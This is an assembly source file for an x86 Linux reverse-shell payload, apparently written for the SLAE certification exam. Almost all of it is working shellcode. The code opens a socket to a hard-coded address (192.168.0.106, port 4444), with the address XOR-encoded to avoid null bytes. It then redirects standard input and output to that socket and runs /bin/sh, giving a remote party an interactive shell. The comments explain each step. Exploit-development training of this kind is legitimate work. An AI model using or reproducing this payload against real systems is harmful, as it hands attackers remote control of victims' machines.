; Filename: reverse.nasm
; Author:  Alex
; SLAE-ID: SLAE-1046
; Website:  http://0xdeadcode.se
;
; Purpose: Assignment 2 - SLAE Exam
;	   Reverse Shell 

global _start			

section .text
_start:

	; int socketcall(int call, unsigned long *args) from man page
        ; int sock = socket(AF_INET, SOCK_STREAM, 0)    from bind shell code
        ; SOCK_STREAM is represented by 1
        ; AF_INET is represented by 2
        ; push args on stack (in reverse order)
        ; put selected call (socket = 1) in ebx
        ; put syscall hex(nr) in eax

        xor eax, eax
        xor ebx, ebx
        ; xor edi, edi  ; MIGHT FIX THIS LATER

        push eax                ; push 0 to stack
        inc eax
        push eax                ; push 1 to stack (SOCK_STREAM)
        inc eax
        push eax                ; push 2 to stack (AF_INET)

        mov al, 0x66            ; socketcall (102 dec is 0x66)
        mov bl, 0x1             ; socket()
        mov ecx, esp            ; pointer to the arguments we pushed
        int 0x80                ; syscall
        mov edx, eax            ; save return value (sockfd)

	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;struct sockaddr_in {
	;  __kernel_sa_family_t  sin_family;     /* Address family               */
	;  __be16                sin_port;       /* Port number                  */
	;  struct in_addr        sin_addr;       /* Internet address             */
	;};	

	; Issue with NULL in IP:
	; 0x6A00A8C0 is 192.168.0.106 in reverse
	; this is not good. our dest IP contain a null
	; we'll fix this with xor
	; 0x95ff573f is result of:
	; 	mov edi, 0xFFFFFFFF
	; 	xor edi, 0x6A00A8C0
	; this mean we can use the xor:ed value and xor it again to get our IP with the null

	mov edi, 0xFFFFFFFF
	xor edi, 0x95ff573f
	push edi
        push word 0x5c11        ; push port number 4444 in reverse
        inc ebx                 ; ebx is increased with 1 from 0x1
 	push word bx            ; AF_INET = 2
	mov ecx, esp		; pointer to sockaddr struct
	push 0x10		; length of the sockaddr struct (decimal 16)
	push ecx		; push pointer to sockaddr
	push edx		; push pointer to sockfd
	mov ecx, esp		; pointer to sockaddr_in struct
	mov al, 0x66            ; socketcall (102 dec is 0x66)
	inc ebx			; connect (0x3)
	int 0x80		; syscall

	; point stdin, stdout and stderr to our new socket
	; from linux man pages: int dup2(int oldfd, int newfd)
        ; edx is the socket we created at start

	xor ecx, ecx
	mov cl, 0x2		; initiate our counter (0x2)
	mov ebx, edx		; move socket into ebx (sockfd)	
	loc_loop:
	mov al, 0x3f            ; dup2 req. eax being 0x3f
	int 0x80                ; syscall
	dec ecx                 ; decrease ecx (socket newfd)
	jns loc_loop            ; jump if loop ain't done (ecx != 0)

        ; execve /bin/sh
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        ; execve("/bin/sh", argv, NULL);
        ; eax should contain 0xb

	xor edi, edi
        push edi                ; register is 0x0 at this time. push null on stack
        mov al, 0xb             ; sys_execve (decimal 11)
        push 0x68732f2f         ; hs//
        push 0x6e69622f         ; nib/
        mov ebx, esp            ; save pointer to /bin/sh
        push edi                ; register is 0x0 at this time. push null on stack
        mov edx, esp            ; move pointer to null into edx
        push ebx                ; push pointer to /bin/sh onto stack
        mov ecx, esp            ; move stack pointer to ecx
        int 0x80                ; syscall

